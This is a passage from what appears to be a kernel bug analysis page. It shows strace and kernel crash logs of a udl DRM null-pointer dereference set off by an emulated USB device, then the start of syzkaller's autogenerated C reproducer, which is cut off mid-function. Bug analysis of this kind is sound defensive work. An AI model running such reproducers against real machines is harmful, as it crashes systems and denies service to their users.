[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg2&quot;, ifr_ifindex=27}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(3)                    = 0
[pid  5086] mkdir(&quot;/dev/binderfs&quot;, 0777) = 0
[pid  5086] mount(&quot;binder&quot;, &quot;/dev/binderfs&quot;, &quot;binder&quot;, 0, NULL) = 0
[pid  5086] symlink(&quot;/dev/binderfs&quot;, &quot;./binderfs&quot;) = 0
[pid  5086] openat(AT_FDCWD, &quot;/dev/raw-gadget&quot;, O_RDWR) = 3
[pid  5086] ioctl(3, USB_RAW_IOCTL_INIT, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, UI_DEV_CREATE or USB_RAW_IOCTL_RUN, 0) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 18
[   78.367556][    T9] usb 1-1: new high-speed USB device number 2 using dummy_hcd
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 18
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 9
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_WRITE, 0x7ffe55bbc480) = 18
[pid  5086] ioctl(3, USB_RAW_IOCTL_EVENT_FETCH, 0x7ffe55bbd490) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_VBUS_DRAW, 0) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_CONFIGURE, 0) = 0
[pid  5086] ioctl(3, USB_RAW_IOCTL_EP0_READ, 0x7ffe55bbc480) = 0
[   78.727398][    T9] usb 1-1: config 0 interface 0 has no altsetting 0
[   78.734299][    T9] usb 1-1: New USB device found, idVendor=17e9, idProduct=8b4e, bcdDevice=9c.08
[   78.743870][    T9] usb 1-1: New USB device strings: Mfr=0, Product=0, SerialNumber=0
[   78.755503][    T9] usb 1-1: config 0 descriptor??
[pid  5086] close(3)                    = 0
[pid  5086] close(4)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(5)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(6)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(7)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(8)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(9)                    = -1 EBADF (Bad file descriptor)
[pid  5086] close(10)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(11)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(12)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(13)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(14)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(15)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(16)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(17)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(18)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(19)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(20)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(21)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(22)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(23)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(24)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(25)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(26)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(27)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(28)                   = -1 EBADF (Bad file descriptor)
[pid  5086] close(29)                   = -1 EBADF (Bad file descriptor)
[pid  5086] exit_group(1)               = ?
[   79.057698][    T9] [drm] vendor descriptor length:b9 data:00 00 00 00 00 00 00 00 00 00 00
[   79.066349][    T9] [drm:udl_init] *ERROR* Unrecognized vendor firmware descriptor
[   79.091368][    T9] [drm:udl_init] *ERROR* Selecting channel failed
[   79.106891][    T9] [drm] Initialized udl 0.0.1 20120220 for 1-1:0.0 on minor 2
[   79.115214][    T9] [drm] Initialized udl on minor 2
[   79.137963][    T9] udl 1-1:0.0: [drm] *ERROR* Read EDID byte 0 failed err ffffffb9
[   79.146780][    T9] udl 1-1:0.0: [drm] Cannot find any crtc or sizes
[   79.154591][    T9] general protection fault, probably for non-canonical address 0xdffffc0000000028: 0000 [#1] PREEMPT SMP KASAN
[   79.166335][    T9] KASAN: null-ptr-deref in range [0x0000000000000140-0x0000000000000147]
[   79.174749][    T9] CPU: 0 PID: 9 Comm: kworker/0:1 Not tainted 6.3.0-rc4-next-20230330-syzkaller #0
[   79.184037][    T9] Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 03/02/2023
[   79.194097][    T9] Workqueue: usb_hub_wq hub_event
[   79.199141][    T9] RIP: 0010:drm_crtc_next_vblank_start+0xb3/0x2b0
[   79.205577][    T9] Code: e8 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 &lt;0f&gt; b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 67
[   79.225197][    T9] RSP: 0018:ffffc900000e6bb0 EFLAGS: 00010207
[   79.231279][    T9] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[   79.239261][    T9] RDX: 0000000000000028 RSI: ffffffff849f2afb RDI: ffff888079558338
[   79.247252][    T9] RBP: ffffc900000e6c48 R08: 0000000000000005 R09: 0000000000000000
[   79.255232][    T9] R10: 0000000000000001 R11: 0000000000000010 R12: ffff8880795590d8
[   79.263222][    T9] R13: 0000000000000144 R14: ffff8880795590d8 R15: dffffc0000000000
[   79.271206][    T9] FS:  0000000000000000(0000) GS:ffff8880b9800000(0000) knlGS:0000000000000000
[   79.280154][    T9] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   79.286765][    T9] CR2: 00007f17191c7688 CR3: 00000000281af000 CR4: 00000000003506f0
[   79.294751][    T9] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   79.302732][    T9] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   79.310716][    T9] Call Trace:
[   79.314010][    T9]  &lt;TASK&gt;
[   79.316949][    T9]  drm_atomic_helper_wait_for_fences+0x1b4/0x780
[   79.323319][    T9]  ? drm_atomic_helper_check+0x190/0x190
[   79.328992][    T9]  ? drm_atomic_helper_prepare_planes+0x59b/0xba0
[   79.335444][    T9]  drm_atomic_helper_commit+0x1bd/0x370
[   79.341023][    T9]  ? drm_atomic_helper_setup_commit+0x1770/0x1770
[   79.347475][    T9]  drm_atomic_commit+0x20a/0x300
[   79.352472][    T9]  ? drm_atomic_state_alloc+0x110/0x110
[   79.358043][    T9]  ? __drm_printfn_seq_file+0x50/0x50
[   79.363444][    T9]  ? drm_client_rotation+0x45b/0x730
[   79.368751][    T9]  drm_client_modeset_commit_atomic+0x69b/0x7e0
[   79.375019][    T9]  ? __mutex_lock+0x231/0x1350
[   79.379827][    T9]  ? drm_client_rotation+0x730/0x730
[   79.385133][    T9]  ? __mutex_lock+0x231/0x1350
[   79.389916][    T9]  ? __mutex_unlock_slowpath+0x157/0x5e0
[   79.395587][    T9]  ? wait_for_completion_io_timeout+0x20/0x20
[   79.401688][    T9]  ? __drm_fb_helper_initial_config_and_unlock+0xe71/0x1510
[   79.409011][    T9]  drm_client_modeset_commit_locked+0x149/0x580
[   79.415280][    T9]  drm_client_modeset_commit+0x51/0x80
[   79.420765][    T9]  __drm_fb_helper_initial_config_and_unlock+0x118a/0x1510
[   79.428007][    T9]  ? mutex_lock_io_nested+0x11a0/0x11a0
[   79.433587][    T9]  ? drm_fb_helper_find_color_mode_format.isra.0+0x1e0/0x1e0
[   79.440999][    T9]  ? drm_prime_init_file_private+0x23/0x90
[   79.446828][    T9]  ? drm_file_alloc+0x548/0x950
[   79.451703][    T9]  drm_fb_helper_initial_config+0x42/0x60
[   79.457460][    T9]  drm_fbdev_generic_client_hotplug+0x1ab/0x270
[   79.463736][    T9]  drm_fbdev_generic_setup+0x127/0x3b0
[   79.469228][    T9]  udl_usb_probe+0x120/0x190
[   79.473841][    T9]  usb_probe_interface+0x30f/0x960
[   79.478979][    T9]  ? usb_match_dynamic_id+0x1a0/0x1a0
[   79.484373][    T9]  really_probe+0x240/0xca0
[   79.488911][    T9]  __driver_probe_device+0x1df/0x4d0
[   79.494229][    T9]  ? usb_match_id.part.0+0x15d/0x1b0
[   79.499537][    T9]  driver_probe_device+0x4c/0x1a0
[   79.504586][    T9]  __device_attach_driver+0x1d4/0x2e0
[   79.509995][    T9]  bus_for_each_drv+0x149/0x1d0
[   79.514868][    T9]  ? driver_probe_device+0x1a0/0x1a0
[   79.520178][    T9]  ? bus_for_each_dev+0x1c0/0x1c0
[   79.525223][    T9]  ? _raw_spin_unlock_irqrestore+0x54/0x70
[   79.531059][    T9]  ? lockdep_hardirqs_on+0x7d/0x100
[   79.536278][    T9]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[   79.542138][    T9]  __device_attach+0x1e4/0x4b0
[   79.546994][    T9]  ? device_driver_attach+0x210/0x210
[   79.552433][    T9]  ? do_raw_spin_unlock+0x175/0x230
[   79.557695][    T9]  bus_probe_device+0x17c/0x1c0
[   79.562581][    T9]  device_add+0x11c4/0x1c50
[   79.567135][    T9]  ? __fw_devlink_link_to_consumers.isra.0+0x270/0x270
[   79.574005][    T9]  ? mark_held_locks+0x9f/0xe0
[   79.578803][    T9]  ? _raw_spin_unlock_irqrestore+0x54/0x70
[   79.584641][    T9]  usb_set_configuration+0x10ee/0x1af0
[   79.590131][    T9]  usb_generic_driver_probe+0xcf/0x130
[   79.595626][    T9]  usb_probe_device+0xd8/0x2c0
[   79.600416][    T9]  ? usb_driver_release_interface+0x190/0x190
[   79.606506][    T9]  really_probe+0x240/0xca0
[   79.611035][    T9]  __driver_probe_device+0x1df/0x4d0
[   79.616355][    T9]  driver_probe_device+0x4c/0x1a0
[   79.621410][    T9]  __device_attach_driver+0x1d4/0x2e0
[   79.626810][    T9]  bus_for_each_drv+0x149/0x1d0
[   79.631685][    T9]  ? driver_probe_device+0x1a0/0x1a0
[   79.636997][    T9]  ? bus_for_each_dev+0x1c0/0x1c0
[   79.642139][    T9]  ? _raw_spin_unlock_irqrestore+0x54/0x70
[   79.647971][    T9]  ? lockdep_hardirqs_on+0x7d/0x100
[   79.653360][    T9]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[   79.659192][    T9]  __device_attach+0x1e4/0x4b0
[   79.664004][    T9]  ? device_driver_attach+0x210/0x210
[   79.669405][    T9]  ? do_raw_spin_unlock+0x175/0x230
[   79.674639][    T9]  bus_probe_device+0x17c/0x1c0
[   79.679778][    T9]  device_add+0x11c4/0x1c50
[   79.684305][    T9]  ? __fw_devlink_link_to_consumers.isra.0+0x270/0x270
[   79.691180][    T9]  ? usb_detect_static_quirks+0x305/0x3b0
[   79.696936][    T9]  ? mark_held_locks+0x9f/0xe0
[   79.701731][    T9]  usb_new_device+0xcb2/0x19d0
[   79.706542][    T9]  ? hub_disconnect+0x510/0x510
[   79.711432][    T9]  ? _raw_spin_unlock_irq+0x23/0x50
[   79.716662][    T9]  hub_event+0x2d9e/0x4e40
[   79.721125][    T9]  ? hub_port_debounce+0x3b0/0x3b0
[   79.726269][    T9]  ? lock_sync+0x190/0x190
[   79.730719][    T9]  ? rcu_is_watching+0x12/0xb0
[   79.735518][    T9]  ? trace_lock_acquire+0x12d/0x180
[   79.740740][    T9]  ? process_one_work+0x8b7/0x15e0
[   79.745881][    T9]  ? lock_acquire+0x32/0xc0
[   79.750411][    T9]  ? process_one_work+0x8b7/0x15e0
[   79.755553][    T9]  process_one_work+0x99a/0x15e0
[   79.760523][    T9]  ? pwq_dec_nr_in_flight+0x2a0/0x2a0
[   79.765923][    T9]  ? rcu_is_watching+0x12/0xb0
[   79.771017][    T9]  ? spin_bug+0x1c0/0x1c0
[   79.775379][    T9]  ? lock_acquire+0x32/0xc0
[   79.779919][    T9]  ? worker_thread+0x16d/0x10c0
[   79.784800][    T9]  worker_thread+0x67d/0x10c0
[   79.789512][    T9]  ? process_one_work+0x15e0/0x15e0
[   79.794743][    T9]  kthread+0x33e/0x440
[   79.798833][    T9]  ? kthread_complete_and_exit+0x40/0x40
[   79.804489][    T9]  ret_from_fork+0x1f/0x30
[   79.808943][    T9]  &lt;/TASK&gt;
[   79.811968][    T9] Modules linked in:
[   79.818794][    T9] ---[ end trace 0000000000000000 ]---
[   79.826339][    T9] RIP: 0010:drm_crtc_next_vblank_start+0xb3/0x2b0
[   79.832893][    T9] Code: e8 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 &lt;0f&gt; b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 67
[   79.852634][    T9] RSP: 0018:ffffc900000e6bb0 EFLAGS: 00010207
[   79.858765][    T9] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[   79.866753][    T9] RDX: 0000000000000028 RSI: ffffffff849f2afb RDI: ffff888079558338
[   79.874775][    T9] RBP: ffffc900000e6c48 R08: 0000000000000005 R09: 0000000000000000
[   79.882930][    T9] R10: 0000000000000001 R11: 0000000000000010 R12: ffff8880795590d8
[   79.891001][    T9] R13: 0000000000000144 R14: ffff8880795590d8 R15: dffffc0000000000
[   79.899053][    T9] FS:  0000000000000000(0000) GS:ffff8880b9800000(0000) knlGS:0000000000000000
[   79.908092][    T9] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   79.914698][    T9] CR2: 00007f17191c7688 CR3: 000000002b398000 CR4: 00000000003506f0
[   79.922755][    T9] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   79.930786][    T9] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   79.938990][    T9] Kernel panic - not syncing: Fatal exception
[   79.945279][    T9] Kernel Offset: disabled
[   79.949614][    T9] Rebooting in 86400 seconds..
</pre></div>
</div>
</section>
<section id="poc">
<h2>POC<a class="headerlink" href="#poc" title="Permalink to this heading">#</a></h2>
<div class="highlight-cpp notranslate"><div class="highlight"><pre><span></span><span class="c1">// https://syzkaller.appspot.com/bug?id=56e9aec9bc3b5378c9b231a3f4b3329cf9f80990</span>
<span class="c1">// autogenerated by syzkaller (https://github.com/google/syzkaller)</span>

<span class="cp">#define _GNU_SOURCE</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;arpa/inet.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;endian.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;errno.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;net/if.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;net/if_arp.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;netinet/in.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sched.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdarg.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdbool.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stddef.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/ioctl.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/mount.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/prctl.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/resource.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/syscall.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/time.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/uio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/wait.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/capability.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/genetlink.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/if_addr.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/if_ether.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/if_link.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/if_tun.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/in6.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/ip.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/neighbour.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/net.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/netlink.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/rtnetlink.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/tcp.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/usb/ch9.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/veth.h&gt;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">procid</span><span class="p">;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sleep_ms</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">ms</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">usleep</span><span class="p">(</span><span class="n">ms</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">write_file</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">what</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
<span class="w">  </span><span class="kt">va_list</span><span class="w"> </span><span class="n">args</span><span class="p">;</span>
<span class="w">  </span><span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">what</span><span class="p">);</span>
<span class="w">  </span><span class="n">vsnprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="n">what</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
<span class="w">  </span><span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="w">  </span><span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">O_WRONLY</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_CLOEXEC</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">errno</span><span class="p">;</span>
<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">    </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">pos</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">nesting</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="w"> </span><span class="n">nested</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
<span class="p">};</span>


<span class="c1">//  netlink_*   函数：使用netlink接口与Linux内核通信，用于配置网络设备</span>
<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_init</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">typ</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span>
<span class="w">                         </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">nlmsg</span><span class="p">));</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="o">*</span><span class="w"> </span><span class="n">hdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="o">*</span><span class="p">)</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">typ</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NLM_F_REQUEST</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NLM_F_ACK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
<span class="w">  </span><span class="n">memcpy</span><span class="p">(</span><span class="n">hdr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>
<span class="w">  </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">hdr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_attr</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">typ</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">data</span><span class="p">,</span>
<span class="w">                         </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="p">)</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">;</span>
<span class="w">  </span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">attr</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
<span class="w">  </span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">typ</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
